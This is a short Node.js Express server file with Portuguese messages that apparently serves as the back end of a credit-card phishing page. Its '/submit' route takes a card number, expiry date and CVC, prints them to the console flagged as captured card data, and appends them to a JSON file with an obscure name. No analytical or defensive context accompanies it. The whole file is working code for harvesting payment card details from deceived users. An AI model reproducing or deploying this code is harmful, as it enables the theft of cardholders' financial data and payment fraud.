const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 8080;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('./server'));

app.post('/submit', (req, res) => {
  const { Number, Validade, CVC } = req.body;
  console.log('\n[!] Number CC:', Number);
  console.log('[!] Validade:', Validade);
  console.log('[!] Number CVC:', CVC);
  const ok = { Number, Validade, CVC };

  fs.readFile('dre3432432434342342q0000000xy.json', 'utf8', (err, fileData) => {
    let jsonData = [];
    if (!err && fileData) {
      jsonData = JSON.parse(fileData);
    }

    jsonData.push(ok);

    fs.writeFile('dre3432432434342342q0000000xy.json', JSON.stringify(jsonData, null, 2), (writeErr) => {
      if (writeErr) {
        console.error('realmente não entendo onde vamos chegar:', writeErr);
        res.status(500).send('eu não compreendo');
      } else {
        res.send('ta tudo bem');
      }
    });
  });
});

app.listen(port, () => {
  const miku_desgraçadona = "\n[-] ...";
  console.log(`[-] Servidor rodando em http://localhost:${port}`);
  console.log(miku_desgraçadona);
});
  